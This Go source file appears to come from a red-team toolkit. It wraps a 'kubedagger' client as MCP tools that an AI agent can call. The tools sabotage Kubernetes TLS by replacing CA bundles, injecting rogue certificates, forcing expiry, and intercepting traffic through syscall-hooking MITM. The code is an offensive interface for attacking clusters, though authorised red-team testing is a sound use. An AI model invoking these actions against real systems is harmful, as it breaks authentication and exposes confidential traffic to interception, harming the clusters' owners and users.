package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

// Cert Sabotage

type CertSabotageInput struct {
	Action    string `json:"action"`
	Target    string `json:"target,omitempty"`
	Namespace string `json:"namespace,omitempty"`
	Secret    string `json:"secret,omitempty"`
}

type CertSabotageTool struct {
	exec executor.Executor
}

func NewCertSabotage(exec executor.Executor) *CertSabotageTool {
	return &CertSabotageTool{exec: exec}
}

func (t *CertSabotageTool) Name() string { return "kubedagger_cert_sabotage" }

func (t *CertSabotageTool) Description() string {
	return "Sabotage TLS certificates in the cluster by intercepting cert-manager operations, replacing CA bundles, or injecting rogue certificates into secrets. Can cause mTLS authentication failures or enable MITM."
}

func (t *CertSabotageTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["replace-ca", "inject-cert", "expire", "mitm", "status"],
				"description": "Certificate sabotage action"
			},
			"target": {
				"type": "string",
				"description": "Target service or ingress"
			},
			"namespace": {
				"type": "string",
				"description": "Target namespace"
			},
			"secret": {
				"type": "string",
				"description": "TLS secret name to target"
			}
		},
		"required": ["action"]
	}`)
}

func (t *CertSabotageTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input CertSabotageInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Target, "target"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateNamespace(input.Namespace); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Secret, "secret"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"cert-sabotage", "--action", input.Action}
	if input.Target != "" {
		args = append(args, "--target", input.Target)
	}
	if input.Namespace != "" {
		args = append(args, "--namespace", input.Namespace)
	}
	if input.Secret != "" {
		args = append(args, "--secret", input.Secret)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger cert-sabotage failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger Cert Sabotage: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("Sabotage active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}

// Keyring MITM

type KeyringMITMInput struct {
	Action string `json:"action"`
	Target string `json:"target,omitempty"`
	Port   int    `json:"port,omitempty"`
}

type KeyringMITMTool struct {
	exec executor.Executor
}

func NewKeyringMITM(exec executor.Executor) *KeyringMITMTool {
	return &KeyringMITMTool{exec: exec}
}

func (t *KeyringMITMTool) Name() string { return "kubedagger_keyring_mitm" }

func (t *KeyringMITMTool) Description() string {
	return "Perform MITM attacks by intercepting TLS handshakes and substituting certificates from the kernel keyring. Hooks connect/accept syscalls to inject rogue certs transparently to both client and server."
}

func (t *KeyringMITMTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["start", "stop", "status"],
				"description": "MITM action"
			},
			"target": {
				"type": "string",
				"description": "Target service to MITM"
			},
			"port": {
				"type": "integer",
				"description": "Target port"
			}
		},
		"required": ["action"]
	}`)
}

func (t *KeyringMITMTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input KeyringMITMInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Target, "target"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"keyring-mitm", "--action", input.Action}
	if input.Target != "" {
		args = append(args, "--target", input.Target)
	}
	if input.Port > 0 {
		args = append(args, "--port", fmt.Sprintf("%d", input.Port))
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger keyring-mitm failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger Keyring MITM: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("MITM active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
